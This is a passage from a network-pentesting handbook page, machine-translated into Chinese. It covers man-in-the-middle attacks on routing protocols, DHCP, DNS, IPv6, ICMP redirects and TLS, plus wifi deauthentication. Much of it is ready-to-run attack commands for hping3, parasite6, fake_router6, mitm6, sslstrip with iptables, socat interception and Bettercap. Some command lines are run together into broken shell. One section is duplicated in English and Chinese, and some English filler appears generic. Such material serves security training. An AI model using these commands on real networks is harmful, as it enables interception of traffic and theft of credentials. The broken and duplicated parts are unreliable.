* 在使用集线器或类似设备进行身份验证后注入恶意网络流量

如果攻击者位于受害者和认证服务器之间，他可以尝试将认证协议降级到EAP-MD5并捕获认证尝试。然后，他可以使用以下方法进行暴力破解：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP（GLBP和HSRP）攻击 <a href="#6196" id="6196"></a>

**FHRP**（First Hop Redundancy Protocol）是一类用于创建热备份路由系统的网络协议。通过使用FHRP，物理路由器可以组合成一个单一的逻辑设备，从而增加容错性并帮助分担负载。

**思科系统的工程师开发了两种FHRP协议，即GLBP和HSRP。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

路由信息协议（RIP）存在三个版本——RIP、RIPv2和RIPng。RIP和RIPv2使用通过端口520发送给对等方的UDP数据报，而RIPng通过IPv6组播广播数据报到UDP端口521。RIPv2引入了MD5认证支持。RIPng不包含本地认证，而是依赖于IPv6中的可选IPsec AH和ESP头。

有关如何攻击此协议的更多信息，请参阅书籍《网络安全评估：了解您的网络（第三版）》。

### EIGRP攻击

**EIGRP（增强内部网关路由协议）**是一种动态路由协议。它是一种距离矢量协议。如果没有身份验证和被动接口的配置，**入侵者**可以干扰EIGRP路由并导致**路由表污染**。此外，EIGRP网络（换句话说，自治系统）**是平坦的，没有分段成任何区域**。如果**攻击者注入一条路由**，很可能这条路由会在自治EIGRP系统中**传播**。

攻击EIGRP系统需要**与合法的EIGRP路由器建立邻居关系**，这打开了许多可能性，从基本的侦察到各种注入。

\*\*\*\*[**FRRouting**](https://frrouting.org/)允许您实现**支持BGP、OSPF、EIGRP、RIP和其他协议的虚拟路由器**。您只需在攻击者的系统上部署它，就可以假装成路由域中的合法路由器。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)还支持捕获EIGRP广播和注入数据包以操纵路由配置。有关如何使用Coly攻击它的更多信息，请参阅书籍《网络安全评估：了解您的网络（第三版）》。

### OSPF

大多数Open Shortest Path First（OSPF）实现使用MD5提供路由器之间的身份验证。Loki和John the Ripper可以捕获和攻击MD5哈希以揭示密钥，然后可以使用该密钥来广告新路由。可以使用“注入”选项卡设置路由参数，并在“连接”下设置密钥。

有关如何攻击此协议的更多信息，请参阅书籍《网络安全评估：了解您的网络（第三版）》。

### 其他通用工具和资源

* [**Above**](https://github.com/c4s73r/Above)：用于扫描网络流量并查找漏洞的工具
* 您可以在[此处](https://github.com/Sab0tag3d/MITM-cheatsheet)找到有关网络攻击的更多信息。 _(TODO: 阅读所有内容和任何新攻击（如果有）)_ 

## **欺骗**

攻击者通过发送虚假的DHCP响应来配置新加入网络的成员的所有网络参数（GW、IP、DNS）。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP欺骗

请查看[前一节](./#arp-spoofing)。

### ICMP重定向

ICMP重定向是指发送一个ICMP数据包，类型为1，代码为5，表示攻击者是到达某个IP地址的最佳路径。然后，当受害者想要联系该IP地址时，它会通过攻击者发送数据包。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS欺骗

攻击者将解析受害者请求的一些（或全部）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用dnsmasq配置自己的DNS**

Dnsmasq是一个功能强大的工具，可以用于配置和管理本地DNS服务器。通过使用dnsmasq，您可以自定义DNS解析，以便更好地控制网络流量和访问。

以下是配置自己的DNS服务器的步骤：

1. **安装dnsmasq**：首先，您需要安装dnsmasq软件包。您可以使用适用于您的操作系统的包管理器来安装它。

2. **编辑配置文件**：打开dnsmasq的配置文件（通常位于/etc/dnsmasq.conf或/etc/dnsmasq.d/目录中的文件）。在文件中，您可以定义自己的DNS解析规则。

3. **添加自定义解析规则**：在配置文件中，您可以使用以下语法添加自定义解析规则：

   ```
   address=/example.com/192.168.1.100
   ```

   这将将example.com解析为IP地址192.168.1.100。您可以根据需要添加多个解析规则。

4. **重启dnsmasq服务**：保存配置文件后，重新启动dnsmasq服务以使更改生效。您可以使用以下命令来重启服务：

   ```
   sudo systemctl restart dnsmasq
   ```

5. **配置客户端**：最后，您需要将客户端设备的DNS设置指向您的dnsmasq服务器。您可以在网络设置中更改DNS服务器的地址。

通过按照上述步骤配置自己的DNS服务器，您将能够更好地控制网络流量和访问，并实现更高级的网络配置。
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

通常存在多个系统和网络的路由。在构建本地网络中的MAC地址列表后，使用 _gateway-finder.py_ 来识别支持IPv4转发的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [欺骗LLMNR、NBT-NS和mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft系统在DNS查找失败时，使用链路本地组播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）进行本地主机解析。Apple Bonjour和Linux零配置实现使用多播DNS（mDNS）来发现网络中的系统。这些协议是未经身份验证的，并通过UDP广播消息；因此，攻击者可以利用它们将用户引导到恶意服务。

您可以使用Responder发送虚假响应来冒充主机搜索的服务。\
阅读此处有关[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的更多信息。

### [欺骗WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

许多浏览器使用Web代理自动发现（WPAD）从网络加载代理设置。WPAD服务器通过特定的URL（例如，[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）提供客户端代理设置，当通过以下任一方式识别时：

* DHCP，使用代码252条目[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS，在本地域中搜索_wpad_主机名
* Microsoft LLMNR和NBT-NS（在DNS查找失败的情况下）

Responder自动化了WPAD攻击-运行代理并通过DHCP、DNS、LLMNR和NBT-NS将客户端引导到恶意WPAD服务器。\
阅读此处有关[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的更多信息。

### [欺骗SSDP和UPnP设备](spoofing-ssdp-and-upnp-devices.md)

您可以在网络中提供不同的服务，试图欺骗用户输入一些明文凭据。**有关此攻击的更多信息，请参阅**[**欺骗SSDP和UPnP设备**](spoofing-ssdp-and-upnp-devices.md)**。**

### IPv6邻居欺骗

这种攻击与ARP欺骗非常相似，但适用于IPv6环境。您可以让受害者认为网关的IPv6具有攻击者的MAC地址。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6路由器广告欺骗/洪水攻击

一些操作系统默认通过网络中发送的RA数据包来配置网关。为了将攻击者声明为IPv6路由器，您可以使用：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP欺骗

默认情况下，一些操作系统会尝试通过读取网络中的DHCPv6数据包来配置DNS。因此，攻击者可以发送一个DHCPv6数据包来将自己配置为DNS服务器。DHCP还会为受害者提供一个IPv6地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP（伪造页面和JS代码注入）

## 互联网攻击

### sslStrip

基本上，这种攻击的作用是，当**用户**试图**访问**一个**重定向**到**HTTPS**版本的**HTTP**页面时，**sslStrip**将与**客户端**建立**HTTP连接**并与**服务器**建立**HTTPS连接**，从而能够以**明文**方式**嗅探**连接。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息[在这里](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### 用于绕过HSTS的sslStrip+和dns2proxy

**sslStrip+和dns2proxy**与**sslStrip**的**区别**在于它们会将例如_**www.facebook.com**_ **重定向到**_**wwww.facebook.com**_（注意**额外的**“**w**”），并将**此域的地址设置为攻击者的IP**。这样，**客户端**将**连接到**_**wwww.facebook.com**_（攻击者），但在幕后，**sslstrip+**将通过https与**www.facebook.com**保持**真实连接**。

这种技术的**目标**是**避免HSTS**，因为_**wwww**.facebook.com_ **不会**保存在浏览器的缓存中，所以浏览器会被欺骗以使用HTTP进行**Facebook身份验证**。\
请注意，为了执行此攻击，受害者必须首先尝试访问[http://www.faceook.com](http://www.faceook.com)，而不是https。这可以通过修改http页面中的链接来完成。

更多信息[在这里](https://www.bettercap.org/legacy/#hsts-bypass)，[在这里](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)和[在这里](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStrip或sslStrip+不再起作用。这是因为浏览器中预先保存了HSTS规则，所以即使用户第一次访问一个“重要”域，他也会通过HTTPS访问它。此外，请注意，预先保存的规则和其他生成的规则可以使用标志** [**`includeSubdomains`**](https://hstspreload.appspot.com) **，所以之前的** _**wwww.facebook.com**_ **示例将不再起作用，因为** _**facebook.com**_ **使用带有`includeSubdomains`的HSTS。**

待办事项：easy-creds，evilgrade，metasploit，factory

## 在端口上进行TCP监听
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## 在端口上进行TCP + SSL监听

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书进行监听

To perform a man-in-the-middle attack on a network, you can use a certificate to intercept and decrypt network traffic. This technique allows you to listen in on communications between two parties without their knowledge.

Here's how it works:

1. Generate a fake SSL certificate: Create a self-signed SSL certificate or use a tool like `mitmproxy` to generate a certificate that appears legitimate to the target devices.

2. Install the certificate: Install the fake certificate on the device you will be using to intercept the traffic. This can be done by importing the certificate into the device's trusted certificate store.

3. Set up the interception: Configure your device to act as a proxy server and redirect the network traffic through it. This can be done using tools like `mitmproxy`, `Burp Suite`, or `ZAP`.

4. Intercept the traffic: Once the interception is set up, all network traffic passing through your device will be decrypted and accessible for analysis. You can view the decrypted data in tools like `Wireshark` or `mitmproxy`.

5. Analyze the data: With the decrypted traffic, you can analyze the communication between the two parties, including sensitive information such as usernames, passwords, and other confidential data.

It's important to note that performing a man-in-the-middle attack without proper authorization is illegal and unethical. This technique should only be used for legitimate purposes, such as penetration testing or network security assessments with proper consent.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书进行监听并重定向到主机

To listen using a certificate and redirect to the hosts, follow these steps:

1. Generate a valid SSL/TLS certificate for the desired domain or subdomain.
2. Configure the web server to use the generated certificate for SSL/TLS encryption.
3. Set up a reverse proxy on the web server to redirect incoming requests to the desired hosts.
4. Ensure that the DNS records for the domain or subdomain point to the IP address of the web server.
5. Test the setup by accessing the domain or subdomain over HTTPS and verifying that the requests are redirected to the intended hosts.

#### 使用证书进行监听并重定向到主机

要使用证书进行监听并重定向到主机，请按照以下步骤操作：

1. 为所需的域名或子域名生成有效的SSL/TLS证书。
2. 配置Web服务器以使用生成的证书进行SSL/TLS加密。
3. 在Web服务器上设置反向代理，将传入的请求重定向到所需的主机。
4. 确保域名或子域名的DNS记录指向Web服务器的IP地址。
5. 通过HTTPS访问域名或子域名，并验证请求是否被重定向到预期的主机。
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
有时，如果客户端检查CA是否有效，你可以**提供由CA签名的其他主机名的证书**。\
另一个有趣的测试是提供一个**请求的主机名的自签名证书**。

其他要测试的内容包括尝试使用一个有效的证书来签署证书，但该证书不是有效的CA。或者使用有效的公钥，强制使用诸如Diffie-Hellman之类的算法（不需要使用真实私钥解密任何内容），当客户端请求真实私钥的探测（如哈希）时，发送一个伪造的探测，并期望客户端不检查此内容。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 主动发现笔记

请注意，当向一个没有请求端口的设备发送UDP数据包时，会发送一个ICMP（端口不可达）。

### **ARP发现**

ARP数据包用于发现网络中正在使用的IP地址。PC必须对每个可能的IP地址发送请求，只有正在使用的IP地址才会响应。

### **mDNS（多播DNS）**

Bettercap发送一个mDNS请求（每X毫秒一次），请求的内容是 **\_services\_.dns-sd.\_udp.local**，看到这个数据包的机器通常会回应这个请求。然后，它只搜索回应“services”的机器。

**工具**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios名称服务器）**

Bettercap向端口137/UDP广播数据包，请求名称为“CKAAAAAAAAAAAAAAAAAAAAAAAAAAA”。

### **SSDP（简单服务发现协议）**

Bettercap广播SSDP数据包，搜索各种服务（UDP端口1900）。

### **WSD（Web服务发现）**

Bettercap广播WSD数据包，搜索服务（UDP端口3702）。

## 参考资料

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug赏金提示**：**注册**Intigriti，一个由黑客创建的高级**Bug赏金平台**！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
